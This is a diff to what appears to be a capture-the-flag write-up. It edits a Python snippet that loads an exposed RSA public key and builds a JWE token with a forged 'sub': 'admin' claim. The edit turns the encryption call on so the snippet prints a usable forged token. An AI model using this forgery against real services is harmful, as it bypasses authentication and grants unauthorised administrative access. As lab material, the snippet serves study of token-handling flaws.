@@ -190,33 +190,21 @@ from joserfc.jwk import RSAKey
 from joserfc.jwe import JWERegistry
 import json
 
-registry = JWERegistry(
-    algorithms=["RSA-OAEP-256", "A256GCM"]
-)
+# Load the exposed public key
+with open("key.pem", "rb") as f:
+    key = RSAKey.import_key(f.read())
 
-protected = {
-    "cty": "JWT",
-    "alg": "RSA-OAEP-256",
-    "enc": "A256GCM"
-}
+registry = JWERegistry(algorithms=["RSA-OAEP-256", "A256GCM"])
 
-payload = {
-    "sub": "admin"
-}
+# Match the exact header structure of real tokens
+protected = {"cty": "JWT", "alg": "RSA-OAEP-256", "enc": "A256GCM"}
 
-plaintext = json.dumps(
-    payload,
-    separators=(",", ":")
-).encode()
+# Forge an admin payload
+payload = {"sub": "admin"}
+plaintext = json.dumps(payload, separators=(',', ':')).encode()
 
-# token = jwe.encrypt_compact(
-#     protected,
-#     plaintext,
-#     key,
-#     registry=registry
-# )
-
-# print(token)
+token = jwe.encrypt_compact(protected, plaintext, key, registry=registry)
+print(token)
 ```
 ## Retrieving the Flag
 
